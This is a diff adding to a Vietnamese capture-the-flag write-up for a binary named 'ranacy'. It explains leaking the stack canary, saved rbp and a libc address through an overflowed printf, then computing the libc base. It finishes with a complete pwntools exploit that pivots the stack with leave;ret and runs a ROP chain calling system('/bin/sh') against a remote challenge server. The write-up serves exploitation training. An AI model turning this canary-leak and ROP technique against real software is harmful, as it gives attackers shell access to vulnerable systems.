@@ -184,9 +184,125 @@ ___
   * `pop rbp`: rbp = `[buffer_address]`
   * `ret`: đặt rip = `[buffer_address + 8]`
 
+* `rsp` sẽ trỏ vào xuất phát của buffer_address và thực thi chuỗi ROP được insert vào đấy
+
 **Leak libc_address và xây dựng shell với ROP**:
 
+* Tính `libc_address (libc_base) = leak_libc_function - offset`
+
+  * Để leak địa chỉ libc bất kỳ, vẫn dùng hàm printf() để leak memory vượt ngoài mốc rip, Tức là ngồi overflow cả canary, rbp, rip, sau đó tìm địa chỉ libc:
+  
+  <img width="804" height="440" alt="image" src="https://github.com/user-attachments/assets/19b90319-3856-4150-9311-99ab93499063" />
+  
+  <img width="802" height="428" alt="image" src="https://github.com/user-attachments/assets/d2ceeb87-5ea8-437f-b330-c1663f96871d" />
+  
+  * Giả sử lấy: `0x00007f788c794ca8` trong ảnh
+  
+  * Tim libc_base trong gdb với `vmmap`:
+  
+   <img width="812" height="481" alt="image" src="https://github.com/user-attachments/assets/c8361011-a488-4262-b938-a019f525b256" />
+  
+  * Tính offset:
+    ```
+    offset = 0x00007f788c794ca8 - 0x7f788c76b000
+           = 0x29ca8
+    ```
+  * Vậy có mặc định:
+    ```
+    libc.address = leak_libc_function - 0x29ca8
+    ```
+* Xây script với ROP:
+```python
+from pwn import *
+
+exe = context.binary = ELF('./ranacy', checksec=False)
+context.log_level = 'info'
+
+libc = ELF('./libc.so.6', checksec=False)
+
+# nc 67.223.119.69:5006
+
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+        br *menu
+        x/40gx $rsp
+        ''')
+
+if args.REMOTE:
+    p = remote("67.223.119.69", 5006)   
+else:
+    p = process(exe.path)
+    GDB();
+
+# leak canary & saved_rbp
+p.sendlineafter(b'> ', b'1')
+p.sendafter(b'> ', b'A' * 264 + b'A')
+
+p.sendlineafter(b'> ', b'2')
+p.recvuntil(b'A' * 265)
+leaked = p.recv(13)
+
+canary = u64(b'\x00' + leaked[:7])
+saved_rbp = u64(leaked[7:13].ljust(8, b'\00'))
+log.success(f"canary: {hex(canary)}")
+log.success(f"rbp:    {hex(saved_rbp)}")
+
+# calculate buffer_addr
+buffer_addr = saved_rbp - 0x120
+log.success(f"buffer: {hex(buffer_addr)}")
+
+# leak libc_function
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'> ', b'A' * 288)
+p.sendlineafter(b'> ', b'2')
+p.recvuntil(b'A' * 288)
+
+stack_dump = p.recv(60)
+leak_pos = stack_dump.find(b'\x7f')
+libc_data = stack_dump[leak_pos-5:leak_pos+1]
+libc_func = u64(libc_data.ljust(8, b'\x00'))
+log.success(f"libc_leak: {hex(libc_func)}")
+
+leak_offset = 0x7f81c5363ca8 - 0x7f81c533a000 
+
+# libc_address
+libc.address = libc_func - leak_offset
+log.success(f"libc_base: {hex(libc.address)}")
+
+# create shell with ROp
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+bin_sh = next(libc.search(b"/bin/sh"))
+system = libc.symbols['system']
+ret = rop.find_gadget(['ret'])[0]
+
+log.success(f"pop_rdi: {hex(pop_rdi)}")
+log.success(f"bin_sh:  {hex(bin_sh)}")
+log.success(f"system:  {hex(system)}")
 
 
+# rop = ROP(libc)
+# bin_sh = next(libc.search(b"/bin/sh\x00"))
+# rop.execve(bin_sh, 0, 0)
+# chain = rop.chain()
+
+leave_ret = 0x401275
+
+chain = flat([pop_rdi, bin_sh, ret, system])
+
+final_payload = flat({
+	0: chain,
+	264: canary,
+	272: buffer_addr-8,
+	280: leave_ret
+	})
+
+p.sendlineafter(b'> ', b'1')
+p.send(final_payload)
+p.sendlineafter(b'> ', b'3')
+
+p.interactive()
+```
 
 
